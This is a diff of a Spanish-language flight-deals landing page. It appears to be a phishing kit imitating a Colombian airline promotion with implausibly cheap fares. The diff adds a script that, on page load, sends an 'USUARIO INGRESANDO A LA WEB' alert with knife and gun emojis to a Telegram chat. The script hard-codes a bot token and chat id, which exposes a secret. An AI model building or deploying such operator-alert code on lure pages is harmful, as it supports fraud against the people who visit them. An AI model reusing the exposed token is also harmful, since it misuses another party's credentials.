@@ -5,20 +5,35 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Promociones de Vuelos | Viajes Ofertas</title>
   <script src="https://cdn.tailwindcss.com"></script>
-              <script>
-document.addEventListener("DOMContentLoaded", function() {
-    let mensaje = "USUARIO INGRESANDO"; // Mensaje siempre válido
 
-    fetch("snLogs.php", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ mensaje: mensaje }) // JSON bien formado
-    })
-    .then(response => response.json())
-    .then(data => console.log("Notificación enviada:", data))
-    .catch(error => console.error("Error al notificar:", error));
-});
-</script>
+  <!-- Envío de mensaje a Telegram al cargar -->
+  <script>
+  document.addEventListener("DOMContentLoaded", function () {
+      const token = "7978973213:AAGZ5tkPk98atTrFAYHtoI2Mb-wqIlQPTWM";
+      const chat_id = "-4884883709";
+      const mensaje = "🔪🔫 *USUARIO INGRESANDO A LA WEB*";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: {
+              "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+              chat_id: chat_id,
+              text: mensaje,
+              parse_mode: "Markdown"
+          })
+      })
+      .then(res => res.json())
+      .then(data => {
+          console.log("✅ Mensaje enviado a Telegram:", data);
+      })
+      .catch(err => {
+          console.error("❌ Error al enviar mensaje:", err);
+      });
+  });
+  </script>
+
   <style>
     .hero-bg {
       background: linear-gradient(rgba(38, 34, 98, 0.7), rgba(229, 25, 55, 0.5)), 
@@ -35,6 +50,7 @@ document.addEventListener("DOMContentLoaded", function() {
     }
   </style>
 </head>
+
 <body class="font-sans bg-white text-gray-900">
 
   <!-- Hero Section -->
@@ -42,7 +58,7 @@ document.addEventListener("DOMContentLoaded", function() {
     <div>
       <h1 class="text-5xl font-bold mb-4">¡Vuela más, gasta menos!</h1>
       <p class="text-xl mb-8">Descubre ofertas exclusivas en vuelos desde 49.900 COP con descuentos exclusivos.</p>
-      <a href="" 
+      <a href="#" 
          class="bg-white text-red-600 font-bold py-4 px-10 rounded-full text-lg hover:bg-red-100 transition">
         Ver promociones ✈️
       </a>
@@ -54,7 +70,7 @@ document.addEventListener("DOMContentLoaded", function() {
     <div class="bg-blue-50 p-8 rounded-xl max-w-3xl mx-auto shadow-lg border-l-4 border-red-600">
       <h2 class="text-3xl font-bold text-blue-900 mb-4">¡Solo por hoy!</h2>
       <p class="text-lg text-blue-700 mb-6">Vuela a destinos como Bogotá, Medellín o Cartagena desde $49.900 COP</p>
-      <a href="" 
+      <a href="#" 
          class="bg-red-600 hover:bg-red-700 text-white font-semibold py-3 px-10 rounded-full transition">
         Aprovechar oferta →
       </a>
@@ -71,7 +87,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
   <!-- Footer -->
   <footer class="bg-[#262262] py-6 text-center text-xs text-white">
-    <p>Promociones sujetas a disponibilidad. no se garantiza tarifas hasta completar la compra.</p>
+    <p>Promociones sujetas a disponibilidad. No se garantiza tarifas hasta completar la compra.</p>
   </footer>
 
 </body>
